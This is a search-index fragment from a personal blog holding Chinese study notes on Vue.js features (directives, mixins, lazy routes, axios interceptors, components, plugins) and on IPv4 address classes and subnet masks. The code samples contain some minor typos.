&lt;&#x2F;el-row&gt;\n\n：span每行元素宽总的是24\n","slug":"2021C-S-N夏令营VUE班级讲义","date":"2021-10-04T06:57:00.000Z","categories_index":"学习笔记","tags_index":"C.S.N","author_index":"kif"},{"id":"95705889e919323e9ce5ee71abf5183c","title":"vue部分知识点","content":"vue是什么用于构建用户界面的渐进式开源JS框架，是创建单页应用的Web框架\n核心特征：\n\n数据驱动mvvm\n组件化\n指令系统\n\nSPA与MPASPA单页应用：\n动态重写当前页面数据用以用户交互\nMPA：多页应用，每一个页面都是主页面\nSPA首加载慢：原因：网络延时，资源体积太大\n解决办法：减小入口文件体积，Gzip压缩，静态资源缓存\nv-if和v-show作用：都是控制元素显示与否\n不同点：\n作用机理，v-if控制的是元素是否渲染，而v-show控制css的display属性，故频繁改变现隐状态使用v-show可以减少消耗\nVue实例挂载过程\n调用_init方法(其中定义set、get、delete、destory方法；定义on,off,emit事件；定义update,forceupdate,destoryed生命周期)\n调用$mount挂载实例对象\n挂载是执行mountcomponent方法\n调用render函数创建虚拟dom\n调用updatemount将虚拟DOM挂载到真实DOM，并渲染到页面中\n\nv-if和v-for不建议同时作用于同一元素，v-for优先级高于v-if，故每次都会现循环渲染，在逻辑判断\n路由懒加载整个网页默认是刚打开就去加载所有页面，路由懒加载就是只加载你当前点击的那个模块。\n按需去加载路由对应的资源，提高首屏加载速度（tip:首页不用设置懒加载，而且一个页面加载过后再次访问不会重复加载）。\n实现原理：将路由相关的组件，不再直接导入了，而是改写成异步组件的写法，只有当函数被调用的时候，才去加载对应的组件内容。\n未启用：\nimport Vue from 'vue'\nimport Router from 'vue-router'\nimport HelloWorld from '@/components/HelloWorld'\n\nVue.use(Router)\n\nexport default new Router(&#123;\n   routes: [\n       &#123;\n          path: '/',\n          name: 'HelloWorld',\n          component:HelloWorld\n        &#125;\n   ]\n&#125;)\n\nES 提出的import方法启用：\nimport Vue from 'vue'\nimport Router from 'vue-router'\n\n\nVue.use(Router)\nconst HelloWorld =()=>import(\"@/components/HelloWorld\")\nexport default new Router(&#123;\n   routes: [\n       &#123;\n          path: '/',\n          name: 'HelloWorld',\n          component:HelloWorld\n        &#125;\n   ]\n&#125;)\n\n简化：\nimport Vue from 'vue'\nimport Router from 'vue-router'\n\n\nVue.use(Router)\n//const HelloWorld =()=>inport(\"@/components/HelloWorld\")\nexport default new Router(&#123;\n   routes: [\n       &#123;\n          path: '/',\n          name: 'HelloWorld',\n          component:()=>import(\"@/components/HelloWorld\")\n        &#125;\n   ]\n&#125;)\n\n\n\n为什么data是函数不是对象\n根实例对象data可以是对象也可以是函数（根实例是单例），不会产生数据污染情况\n组件实例对象data必须为函数，目的是为了防止多个组件实例对象之间共用一个data，产生数据污染。采用函数的形式，initData时会将其作为工厂函数都会返回全新data对象\n\nvue2和vue3双向绑定vue2：通过 object.defineProperty 实现，这种方法不会监听到属性变化和数组变化，会造成\n问题：动态给vue的data添加一个新的属性时页面不会刷新Object.defineProperty原理：\nlet obj=&#123;&#125;\nObject.defineProperty(obk,'foo',&#123;\n    get()&#123;\n        return val\n    &#125;,\n    set(newVal)&#123;\n        if(newVal!=val)&#123;\n           val = newVal\n        &#125;\n    &#125;\n&#125;)\n\n​    所以set只能对初始化是已经存在的属性进行赋值，无法拦截到新增属性；\n解决方法\nVue.set()\nobject.assign()\nforceUpdate()强制刷新\n\nvue3针对vue2中的问题，Vue3 使用了ES6新增的Proxy代理来拦截变化，可以监听到属性以及数组变化\nVue中组件和插件组件定义：每一个.vue文件都可以视作一个组件，方便调试， 利于维护等；\n编写模式：每一个vue文件模板：\n&lt;template&gt;&lt;&#x2F;template&gt;\n&lt;script&gt;\nexprot default&#123;\n    \n    &#125;\n&lt;&#x2F;script&gt;\n&lt;style&gt;&lt;&#x2F;style&gt;\n\n我们还可以通过template属性来编写一个组件，如果组件内容多，我们可以在外部定义template组件内容，如果组件内容并不多，我们可直接写在template属性上\n&lt;template id=\"testComponent\">     // 组件显示的内容\n    &lt;div>component!&lt;/div>   \n&lt;/template>\n\nVue.component('componentA',&#123; \n    template: '#testComponent'  \n    template: `&lt;div>component&lt;/div>`  // 组件内容少可以通过这种形式\n&#125;)\n\n注册形式：Vue组件之间的通信方式\n父子关系的组件数据传递选择 props 与 $emit进行传递，也可选择ref\n兄弟关系的组件数据传递可选择$bus，其次可以选择$parent进行传递\n祖先与后代组件数据传递可选择attrs与listeners或者 Provide与 Inject\n复杂关系的组件数据传递可以通过vuex存放共享的变量\n\nvue的mixinmixin（混入），提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。\n本质其实就是一个js对象，它可以包含我们组件中任意功能选项，如data、components、methods、created、computed等等\n我们只要将共用的功能以对象的方式传入 mixins选项中，当组件使用 mixins对象时所有mixins对象的选项都将被混入该组件本身的选项中来\n在Vue中我们可以局部混入跟全局混入\nvue中key的原理\n当我们在使用v-for时，需要给单元加上key\n用+new Date()生成的时间戳作为key，手动强制触发重新渲染\n\nkeep-alive某些情况下不需要对组件重新加载，使用 kepp-alive使得组件可以缓存起来\n使用方法：\n路由中设置是否缓存\n&#123;\n\tpath:'list',\n\tname:'itemList',\n\tcomponent:()=>import('@/conponents/list'),\n\tmeta:&#123;\n\t\tkeepalive:true,\n\t\ttitle:'标题页'\n\t&#125;\n&#125;\n\n&lt;div&gt;\n    &lt;keep-alive&gt;\n        &lt;router-view v-if&#x3D;&#39;$route.meta.keepalive&#39;&gt;&lt;&#x2F;router-view&gt;\n    &lt;&#x2F;keep-alive&gt;\n&lt;&#x2F;div&gt;\n\nVue常用的修饰符vue中修饰符分为以下五种：\n\n表单修饰符\n事件修饰符\n鼠标按键修饰符\n键值修饰符\nv-bind修饰符\n\n表单修饰符lazy在我们填完信息，光标离开标签的时候，才会将值赋予给value，也就是在change事件之后再进行信息同步\n&lt;input type&#x3D;&#39;text&#39; v-model.lazy&#x3D;&quot;message&quot;&gt;\n\ntrim自动过滤用户输入的首空格字符，而中间的空格不会过滤\n&lt;input type&#x3D;&#39;text&#39; v-model.trim&#x3D;&quot;value&quot;&gt;\n\nnumber自动将输入的值转为number\n&lt;input type&#x3D;&quot;number&quot; v-model.number&#x3D;&quot;value&quot;&gt;\n\n事件修饰符stop阻止冒泡事件，相当与调用event.stopPropagation()\n&lt;button @click.stop&#x3D;&quot;on&quot;&gt;\n    点击\n&lt;&#x2F;button&gt;\n\nprevent阻止默认事件\n&lt;button @click.prevent&#x3D;&quot;on&quot;&gt;\n    dian\n&lt;&#x2F;button&gt;\n\nonce只触发一次\n&lt;button @click.once&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt;\n\n鼠标按钮修饰符鼠标按钮修饰符针对的就是左键、右键、中键点击，有如下：\n\nleft 左键点击\nright 右键点击\nmiddle 中键点击\n\n&lt;button @click.left&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt;\n&lt;button @click.right&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt;\n&lt;button @click.middle&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt;\n\nv-bind修饰符async能对props进行一个双向绑定\n\n&#x2F;&#x2F;父组件\n&lt;comp :myMessage.sync&#x3D;&quot;bar&quot;&gt;&lt;&#x2F;comp&gt; \n&#x2F;&#x2F;子组件\nthis.$emit(&#39;update:myMessage&#39;,params);\n\n自定义指令实现自定义指令有全局注册与局部注册\n全局注册Vue.directive第一个参数是指令的名字（不需要写上v-前缀），第二个参数可以是对象数据，也可以是一个指令函数\n局部注册局部注册通过在组件options选项中设置directive属性\n使用自定义指令可以满足我们日常一些场景，这里给出几个自定义指令的案例：\n\n防抖\n图片懒加载\n一键 Copy的功能\n\ndiff算法作用：同级树节点的高效比较算法\n特点：同级比较，循环从两边向中间\n新旧VNode节点如下图所示：\n\n第一次循环后，发现旧节点D与新节点D相同，直接复用旧节点D作为diff后的第一个真实节点，同时旧节点endIndex移动到C，新节点的 startIndex 移动到了 C\n\n第二次循环后，同样是旧节点的末尾和新节点的开头(都是 C)相同，同理，diff 后创建了 C 的真实节点插入到第一次创建的 B 节点后面。同时旧节点的 endIndex 移动到了 B，新节点的 startIndex 移动到了 E\n\n第三次循环中，发现E没有找到，这时候只能直接创建新的真实节点 E，插入到第二次创建的 C 节点之后。同时新节点的 startIndex 移动到了 A。旧节点的 startIndex 和 endIndex 都保持不动\n\n第四次循环中，发现了新旧节点的开头(都是 A)相同，于是 diff 后创建了 A 的真实节点，插入到前一次创建的 E 节点后面。同时旧节点的 startIndex 移动到了 B，新节点的startIndex 移动到了 B\n\n第五次循环中，情形同第四次循环一样，因此 diff 后创建了 B 真实节点 插入到前一次创建的 A 节点后面。同时旧节点的 startIndex移动到了 C，新节点的 startIndex 移动到了 F\n\n新节点的 startIndex 已经大于 endIndex 了，需要创建 newStartIdx 和 newEndIdx 之间的所有节点，也就是节点F，直接创建 F 节点对应的真实节点放到 B 节点后面\n\nAxios定义：是轻量级的Http库，基于XMLHttpRequest,支持promise\n封装项目中对于请求的header，超时时间，不同环境的不同api地址等问题，统一管理便于代码维护\n设置请求前缀if(a)&#123;\n    axios.defaults.baseURL='a'\n&#125;else&#123;\n    axios.defaults.baseURL='b'\n&#125;\n\n\n\n封装请求//get\nexport function httpGet(&#123;\n    url,\n    params = &#123;&#125;\n&#125;) &#123;\n    return new Promise((resolve, reject) => &#123;\n        axios.get(url, &#123;\n            params\n        &#125;).then(res => resolve(res)).catch(err => reject(err))\n    &#125;)\n&#125;\n//post\n\nexport function httpPost(&#123;\n    url,\n    params = &#123;&#125;,\n    data = &#123;&#125;\n&#125;) &#123;\n    return new Promise((resolve, reject) => &#123;\n        axios(&#123;\n            url,\n            method: 'POST',\n            data: data,\n            params\n        &#125;).then((res) => &#123;\n            resilve(res)\n        &#125;).catch((err) => &#123;\n            reject(err)\n        &#125;)\n    &#125;)\n&#125;\n\n拦截器interceptors请求拦截器如有token时header加入token\naxios.intercepter.request.use(config => &#123;\n    let token = localStorage.getItem('token')\n    if (token) &#123;\n        config.headers.Authorization = token\n    &#125;\n    return config\n&#125;)\n\n\n\n响应拦截器axios.intercepter.response.use(response=>&#123;\n    if(response.status==400)&#123;\n        return Promise.reject(response)\n    &#125;else&#123;\n       // ...\n    &#125;\n&#125;)\n\n\n\nSSR解决了什么问题？有做过SSR吗？你是怎么做的SSR主要解决了以下两种问题：\n\nseo：搜索引擎优先爬取页面HTML结构，使用ssr时，服务端已经生成了和业务想关联的HTML，有利于seo\n首屏呈现渲染：用户无需等待页面所有js加载完成就可以看到页面视图（压力来到了服务器，所以需要权衡哪些用服务端渲染，哪些交给客户端）\n\nvue要做权限管理该怎么做？如果控制到按钮级别的权限怎么做？接口权限后端JWT，登录完拿到token，将token存起来，通过axios请求拦截器进行拦截，每次请求的时候头部携带token\n路由权限控制Vue项目中你是如何解决跨域跨域本质是浏览器基于同源策略的一种安全手段\n同源策略：\n\n协议\n主机\n端口\n\n解决跨域的方法有很多，下面列举了三种：\n\nJSONP\nCORS\nPROXY\n\ncors后端方案\ndjango模块：django-cors-headers\npip install django-cors-headers\n\n\n\nProxy\nwebpack可以设置\n服务端设置\nnginx设置反向代理\n\n特性以及部分原理自定义指令（directive）除了核心功能默认内置的指令 (v-model 和 v-show)，Vue 也允许注册自定义指令。有时候我们想对dom进行操作的时候，就可以使用自定义指令，比如设置标题样式并且让标题一直固定在页面上方，可以使用全局注册或者局部注册。然后你可以在模板中任何元素上使用新的 v-title property。\n&#x2F;&#x2F;全局注册\n&lt;div id&#x3D;&quot;app&quot;&gt;\n    &lt;div v-title&gt;hello world&lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n&lt;script&gt;\n    Vue.directive(&#39;title&#39;, &#123;\n        inserted: function (el) &#123;\n            console.log(el)\n            el.style.position &#x3D; &#39;fixed&#39; \n            el.style.top &#x3D; &#39;50px&#39; \n            el.style.left &#x3D; &#39;48%&#39; \n            el.style.color &#x3D; &#39;#409EFF&#39; \n        &#125;\n    &#125;)\n\n    new Vue(&#123;\n        el: &#39;#app&#39;,\n        data: &#123;\n            message: &#39;hello!&#39;\n        &#125;\n    &#125;)\n&lt;&#x2F;script&gt;\n&lt;style&gt;\n   #app&#123;\n       height: 1000px\n   &#125; \n&lt;&#x2F;style&gt;\n&#x2F;&#x2F;局部注册\n  new Vue(&#123;\n    el: &#39;#app&#39;,\n    directives: &#123;\n        title: &#123;\n            inserted: function (el) &#123;\n                console.log(el)\n                el.style.position &#x3D; &#39;fixed&#39;\n                el.style.top &#x3D; &#39;50px&#39;\n                el.style.left &#x3D; &#39;48%&#39;\n                el.style.color &#x3D; &#39;#409EFF&#39;\n            &#125;\n        &#125;\n    &#125;\n  &#125;)\n\n\n\nirective钩子函数参数指令钩子函数会被传入以下参数：\n\nel：指令所绑定的元素，可以用来直接操作 DOM。\nbinding：一个对象，包含以下 property：\n\n\nname：指令名，不包括 v- 前缀。\nvalue：指令的绑定值，例如：v-my-directive&#x3D;”1 + 1” 中，绑定值为 2。\noldValue：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。无论值是否改变都可用。\nexpression：字符串形式的指令表达式。例如 v-my-directive&#x3D;”1 + 1” 中，表达式为 “1 + 1”。\narg：传给指令的参数，可选。例如 v-my-directive:foo 中，参数为 “foo”。\nmodifiers：一个包含修饰符的对象。例如：v-my-directive.foo.bar 中，修饰符对象为 { foo: true, bar: true }。\n\n\nvnode：Vue 编译生成的虚拟节点。移步 VNode API 来了解更多详情。\noldVnode：上一个虚拟节点，仅在 update 和 componentUpdated 钩子中可用。\n\n我们打印下函数传入的参数，其实简单来说就是el就是绑定dom元素，binging指令：后所携带的具体内容，VNode就当还未生成的节点好了。\n&lt;div v-title:arr&#x3D;&quot;message&quot;&gt;hello world&lt;&#x2F;div&gt;\nVue.directive(&#39;title&#39;, &#123;\n        inserted: function (el, binding, vnode) &#123;\n            console.log(el, binding, vnode)\n            el.style.position &#x3D; &#39;fixed&#39; \n            el.style.top &#x3D; &#39;50px&#39; \n            el.style.left &#x3D; &#39;48%&#39; \n            el.style.color &#x3D; &#39;#409EFF&#39; \n        &#125;\n    &#125;)\n复制代码\n\n\n钩子函数一个指令定义对象可以提供如下几个钩子函数 (均为可选)：\n\nbind：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。\ninserted：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。\nupdate：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。\ncomponentUpdated：指令所在组件的 VNode 及其子 VNode 全部更新后调用\nunbind：只调用一次，指令与元素解绑时调用。\n\n我们可以测试下钩子函数的调用时机：\n&lt;div id&#x3D;&quot;app&quot;&gt;\n    &lt;div id&#x3D;&quot;txt&quot; v-title:data&#x3D;&quot;sum&quot;&gt;value: &#123;&#123;sum&#125;&#125;&lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n&lt;script&gt;\n    new Vue(&#123;\n        el: &#39;#app&#39;,\n        data: &#123;\n            sum: 0\n        &#125;,\n        directives: &#123;\n            title: &#123;\n                bind: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;a&#39;) &#125;,&#x2F;&#x2F; 第一次绑定元素时调用\n                inserted: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;b&#39;) &#125;,&#x2F;&#x2F; 当被绑定的元素插入到 DOM 中时……\n                update: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;c&#39;) &#125;,&#x2F;&#x2F; 所在组件VNode发生更新时调用\n                componentUpdated: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;d&#39;) &#125;, &#x2F;&#x2F; 指令所在组件的 VNode 及其子 VNode 全部更新后调用\n                unbind: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;e&#39;) &#125;    &#x2F;&#x2F; 只调用一次，指令与元素解绑时调用\n            &#125;\n        &#125;,\n        mounted() &#123;\n            console.log(this.sum, &#39;???&#39;)\n            let timer &#x3D; setInterval(() &#x3D;&gt; &#123;\n                this.sum++\n            &#125;, 200)\n            setTimeout(() &#x3D;&gt; &#123;\n                clearInterval(timer)\n            &#125;, 3000)\n        &#125;\n    &#125;)\n&lt;&#x2F;script&gt;\n\n\n指令大致原理在页面渲染的过程中，分别有创建(create)、激活(avtivate)、更新(update)、移除(remove)、销毁(destroy)，在这些过程中，框架在每个时段都会调用相应的钩子函数，这些hooks中一部分的函数就包含了我们的指令。源码部分我了解的不多，给大家推荐一篇vue指令原理相关博文www.cnblogs.com/gerry2019/p…\n混入官方是这样定义的：混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。其实就是vue实例的一个复用。实用场景：公共组件或者功能，例如获取用户白名单、菜单返回、公共基础table。 值得注意的点：\n\n当组件和混入对象含有同名选项时，这些选项将以恰当的方式混合。比如，数据对象在内部会进行浅合并 (一层属性深度)，在和组件的数据发生冲突时以组件数据优先。\n同名钩子函数将混合为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。\n值为对象的选项，例如 methods, components 和 directives，将被混合为同一个对象。两个对象键名冲突时，取组件对象的键值对。\n\nvar mixin &#x3D; &#123;\n  data: function () &#123;\n    return &#123;\n      message: &#39;hello&#39;,\n      foo: &#39;abc&#39;\n    &#125;\n  &#125;\n&#125;\n\nnew Vue(&#123;\n  mixins: [mixin],\n  data: function () &#123;\n    return &#123;\n      message: &#39;goodbye&#39;,\n      bar: &#39;def&#39;\n    &#125;\n  &#125;,\n  created: function () &#123;\n    console.log(this.$data)\n    &#x2F;&#x2F; &#x3D;&gt; &#123; message: &quot;goodbye&quot;, foo: &quot;abc&quot;, bar: &quot;def&quot; &#125;\n  &#125;\n&#125;)\n复制代码\n\n高阶组件一个函数接受一个组件为参数，返回一个包装后的组件。其实在vue中，组件可以当做一个函数，那从本质上来说，高阶组件就是高阶函数（JavaScript的函数其实都指向某个变量。既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数）\n高阶函数举例一个最简单的高阶函数计算次方\n function pow(x, y, f)&#123;\n    return f(x, y);\n  &#125;\n  pow(3, 3, Math.pow)\n复制代码\n\n在es6中也有很多高阶函数，如map、reduce、filter。\n高阶组件的例子&lt;div id&#x3D;&quot;app&quot;&gt;\n    &lt;hoc&gt;&lt;&#x2F;hoc&gt;\n&lt;&#x2F;div&gt;\n&lt;script&gt;\n    const view &#x3D; &#123;\n        template: &#96;&lt;span&gt;\n                    &lt;span&gt;test hoc ...&lt;&#x2F;span&gt;\n                    &lt;&#x2F;span&gt;&#96;,\n        props: [&quot;result&quot;, &quot;loading&quot;],\n    &#125;;\n    const test &#x3D; (wrapped, txt &#x3D; &#39;hello&#39;) &#x3D;&gt; &#123;\n        return &#123;\n            render(h) &#123;\n                const args &#x3D; &#123;\n                    props: &#123;\n                        result: this.result,\n                        loading: this.loading,\n                    &#125;,\n                &#125;;\n                const wrapper &#x3D; h(&quot;div&quot;, [\n                    h(wrapped, args),\n                    &#39;loading&#39;\n                ]);\n                return wrapper\n            &#125;\n        &#125;\n    &#125;\n    const hoc &#x3D; test(view, &#39;hui&#39;)\n    console.log(hoc);\n\n    new Vue(&#123;\n        el: &#39;#app&#39;,\n        components: &#123;\n            hoc\n        &#125;,\n        data: &#123;\n            sum: 0\n        &#125;\n    &#125;)\n&lt;&#x2F;script&gt;\n复制代码\n\n\n值得注意的点\n高阶组件(HOC)应该是无副作用的纯函数，且不应该修改原组件,就是组件是一个新的组件，不会对原组件做修改。\n高阶组件(HOC)不关心你传递的数据(props)是什么，并且被包装组件(WrappedComponent)不关心数据来源\n高阶组件(HOC)接收到的 props 应该透传给被包装组件(WrappedComponent)\n在高阶组件中渲染函数向子组件中传递作用域插槽时候要注意上下文\n\n动态组件 异步组件 递归组件动态组件可以在同组件之间进行动态切换， 动态切换可以通过 Vue 的  元素加一个特殊的 is attribute 来实现：\n&lt;!-- 组件会在 &#96;currentTabComponent&#96; 改变时改变 --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Dynamic Components Example&lt;&#x2F;title&gt;\n    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;style&gt;\n      .tab-button &#123;\n        padding: 6px 10px;\n        border-top-left-radius: 3px;\n        border-top-right-radius: 3px;\n        border: 1px solid #ccc;\n        cursor: pointer;\n        background: #f0f0f0;\n        margin-bottom: -1px;\n        margin-right: -1px;\n      &#125;\n      .tab-button:hover &#123;\n        background: #e0e0e0;\n      &#125;\n      .tab-button.active &#123;\n        background: #e0e0e0;\n      &#125;\n      .tab &#123;\n        border: 1px solid #ccc;\n        padding: 10px;\n      &#125;\n    &lt;&#x2F;style&gt;\n  &lt;&#x2F;head&gt;\n  &lt;body&gt;\n    &lt;div id&#x3D;&quot;dynamic-component-demo&quot; class&#x3D;&quot;demo&quot;&gt;\n      &lt;button\n        v-for&#x3D;&quot;tab in tabs&quot;\n        v-bind:key&#x3D;&quot;tab&quot;\n        v-bind:class&#x3D;&quot;[&#39;tab-button&#39;, &#123; active: currentTab &#x3D;&#x3D;&#x3D; tab &#125;]&quot;\n        v-on:click&#x3D;&quot;currentTab &#x3D; tab&quot;\n      &gt;\n        &#123;&#123; tab &#125;&#125;\n      &lt;&#x2F;button&gt;\n\n      &lt;component v-bind:is&#x3D;&quot;currentTabComponent&quot; class&#x3D;&quot;tab&quot;&gt;&lt;&#x2F;component&gt;\n    &lt;&#x2F;div&gt;\n\n    &lt;script&gt;\n      Vue.component(&quot;tab-home&quot;, &#123;\n        template: &quot;&lt;div&gt;Home component&lt;&#x2F;div&gt;&quot;\n      &#125;);\n      Vue.component(&quot;tab-posts&quot;, &#123;\n        template: &quot;&lt;div&gt;Posts component&lt;&#x2F;div&gt;&quot;\n      &#125;);\n      Vue.component(&quot;tab-archive&quot;, &#123;\n        template: &quot;&lt;div&gt;Archive component&lt;&#x2F;div&gt;&quot;\n      &#125;);\n\n      new Vue(&#123;\n        el: &quot;#dynamic-component-demo&quot;,\n        data: &#123;\n          currentTab: &quot;Home&quot;,\n          tabs: [&quot;Home&quot;, &quot;Posts&quot;, &quot;Archive&quot;]\n        &#125;,\n        computed: &#123;\n          currentTabComponent: function() &#123;\n            return &quot;tab-&quot; + this.currentTab.toLowerCase();\n          &#125;\n        &#125;\n      &#125;);\n    &lt;&#x2F;script&gt;\n  &lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n复制代码\n\n异步组件在大型应用中，我们可能需要将应用分割成小一些的代码块，并且只在需要的时候才从服务器加载一个模块。为了简化，Vue 允许你以一个工厂函数的方式定义你的组件，这个工厂函数会异步解析你的组件定义。Vue 只有在这个组件需要被渲染的时候才会触发该工厂函数，且会把结果缓存起来供未来重渲染。\nVue.component(&#39;async-example&#39;, function (resolve, reject) &#123;\n  setTimeout(function () &#123;\n    &#x2F;&#x2F; 向 &#96;resolve&#96; 回调传递组件定义\n    resolve(&#123;\n      template: &#39;&lt;div&gt;I am async!&lt;&#x2F;div&gt;&#39;\n    &#125;)\n  &#125;, 1000)\n&#125;)\n复制代码\n\n在vue-cli中在使用异步组件\nconst first &#x3D;()&#x3D;&gt;import(&#x2F;* webpackChunkName: &quot;group-foo&quot; *&#x2F; &quot;..&#x2F;components&#x2F;first.vue&quot;);\n复制代码\n\nvue中部分钩子函数(@hook)Vue 实例同时在其事件接口中提供了其它的方法。我们可以：\n\n\n\n\n\n\n\n\n\n通过 $on(eventName, eventHandler) 侦听一个事件\n\n\n\n\n\n\n\n\n\n通过 $once(eventName, eventHandler) 一次性侦听一个事件\n\n\n\n\n\n\n\n\n\n通过 $off(eventName, eventHandler) 停止侦听一个事件\n你通常不会用到这些，但是当你需要在一个组件实例上手动侦听事件时，它们是派得上用场的。它们也可以用于代码组织工具。例如，你可能经常看到这种集成一个第三方库的模式。官网提供一个案例：在不使用beforeDestroy钩子清picker\n&#x2F;&#x2F;案例一\nmounted: function () &#123;\n  var picker &#x3D; new Pikaday(&#123;\n    field: this.$refs.input,\n    format: &#39;YYYY-MM-DD&#39;\n  &#125;)\n\n  this.$once(&#39;hook:beforeDestroy&#39;, function () &#123;\n    picker.destroy()\n  &#125;)\n&#125;\n&#x2F;&#x2F;案例二\n&#x2F;&#x2F;在父组件在子组件渲染阶段做一些操作\n&lt;child\n  @hook:mounted&#x3D;&quot;handle&quot;\n  @hook:beforeUpdated&#x3D;&quot;xxx&quot;\n  @hook:updated&#x3D;&quot;xxx&quot;\n&#x2F;&gt;\nmethod () &#123;\n  handle() &#123;\n  &#x2F;&#x2F; do something...\n  &#125;\n&#125;,\n复制代码\n\n在vue生命周期中周期都有对应的钩子函数\n插件插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制——一般有下面几种：\n\n添加全局方法或者 property。如：vue-custom-element\n添加全局资源：指令&#x2F;过滤器&#x2F;过渡等。如 vue-touch\n通过全局混入来添加一些组件选项。如 vue-router\n添加 Vue 实例方法，通过把它们添加到 Vue.prototype 上实现。\n一个库，提供自己的 API，同时提供上面提到的一个或多个功能。如 vue-router\n\n自定义插件\nMyPlugin.install &#x3D; function (Vue, options) &#123;\n  &#x2F;&#x2F; 1. 添加全局方法或 property\n  Vue.myGlobalMethod &#x3D; function () &#123;\n    &#x2F;&#x2F; 逻辑...\n  &#125;\n\n  &#x2F;&#x2F; 2. 添加全局资源\n  Vue.directive(&#39;my-directive&#39;, &#123;\n    bind (el, binding, vnode, oldVnode) &#123;\n      &#x2F;&#x2F; 逻辑...\n    &#125;\n    ...\n  &#125;)\n\n  &#x2F;&#x2F; 3. 注入组件选项\n  Vue.mixin(&#123;\n    created: function () &#123;\n      &#x2F;&#x2F; 逻辑...\n    &#125;\n    ...\n  &#125;)\n\n  &#x2F;&#x2F; 4. 添加实例方法\n  Vue.prototype.$myMethod &#x3D; function (methodOptions) &#123;\n    &#x2F;&#x2F; 逻辑...\n  &#125;\n&#125;\n复制代码\n\n部分参考：作者：仅九链接：https://juejin.cn/post/6985035199432097823\n","slug":"vue部分高级特性","date":"2021-07-16T05:22:00.000Z","categories_index":"学习笔记","tags_index":"Vue.js","author_index":"kif"},{"id":"28d0a4fcfbc7fc3606b73b8705c12a98","title":"标准分类的IP地址","content":"一、标准分类的IP地址\n每台计算机都要有IP地址，有了IP地址才能互相通信，计算机之间只能互相认识IP地址。IP地址可以理解为计算机的×××号。\n（一）二进制和十进制数转换(★记住)\n11111111→128＋64＋32＋16＋8＋4＋2＋1＝240＋15＝255\n举例：\n10100000→128＋32＝160      反过来160＝128＋32→10100000\n10011000→128＋16＋8＝152\n01000100→64＋4＝68\n（二）IP地址的表示\nIPv4地址采用32位的二进制数表示，表示形式为：\n... (其中*表示1个二进制位，共4组，每组8位二进制数)\n比如：11000000.10101000.00000101.00010111\n写成十进制数就是：X.X.X.X（其中X表示0—255之间的一个十进制数），比如：\n192.168.5.23、218.85.157.99、218.85.152.99 是正确的IP地址。\n156.56.45、256.45.345.34、56.0.0.1.7 是错误的IP地址。\n（三）IP地址的分类(记住)\nIP地址分为A类、B类、C类、D类、E类，规定如下：\nA类：网络位8位，主机位24位，网络前导位为0，即：\n0*******...********  即1.0.0.0—127.255.255.255\n网络位00000000不可用，网络位01111111(127)表示回送地址，指本地机。\nB类：网络位16位，主机位16位，网络前导位为10，即：\n10******...********  即128.0.0.0—191.255.255.255\nC类：网络位24位，主机位8位，前导位为110，即：\n110*****...********  即192.0.0.0—223.255.255.255\nD类：组播地址，前导位为1110，即：\n1110****...********  即224.0.0.0—239.255.255.255\nE类：保留地址，前导位为11110，即：\n11110***...********  即240.0.0.0—247.255.255.255\n其中A类、B类、C类IP地址可供普通用户使用。\n（四）私有IP地址(记住)\nIP地址分为公有IP地址和私有IP地址(也称外部IP地址和内部IP地址，或称全局IP地址和专用IP地址)，在互联网中，公有IP地址可以被外网访问，私有IP地址仅用于内部网络使用，不能被外网访问。私有IP地址如下：\nA类：10.0.0.0—10.255.255.255\nB类：172.16.0.0—172.31.255.255\nC类：192.168.0.0—192.168.255.255\n（五）IP地址的相关规定(记住)\n1.网络地址、主机地址、广播地址\nIP地址由“网络位+主机位”组成。\n网络地址：主机位全0\n主机地址：网络位全0\n直接广播地址：主机位全1\n举例：IP地址 201.161.20.18 的网络地址是201.161.20.0，主机地址是0.0.0.18，直接广播地址为201.161.20.255。\n2.可用的IP地址\n主机位不可全0或全1（全0是网络地址，全1是广播地址）\n在一个网段内，最小的可用IP地址是“网络地址+1”，最大的可用IP地址是“广播地址-1”。\n举例：192.168.1.0～192.168.1.255网段中，可用的IP地址是：192.168.1.1～192.168.1.254\n\n受限广播地址(或称为“有限广播地址”)\n\n32位全1的IP地址(255.255.255.255)表示受限广播地址。\n受限广播地址和直接广播地址的区别，举例：255.255.255.255和192.168.5.255。\n交换机转发广播，路由器不转发广播。\n二、子网掩码\n子网掩码用来区别网络位和主机位，用1表示网络位，用0表示主机位。比如：\nA类IP地址的掩码：11111111.00000000.00000000.00000000  写成十进制 255.0.0.0\n也可以用&#x2F;8来表示，表示前8位是网络位，比如：10.3.3.3&#x2F;8\nB类IP地址的掩码：11111111.11111111.00000000.00000000  写成十进制 255.255.0.0\n也可以用&#x2F;16来表示，表示前16位是网络位，比如：172.16.7.6&#x2F;16\nC类IP地址的掩码：11111111.11111111.11111111.00000000  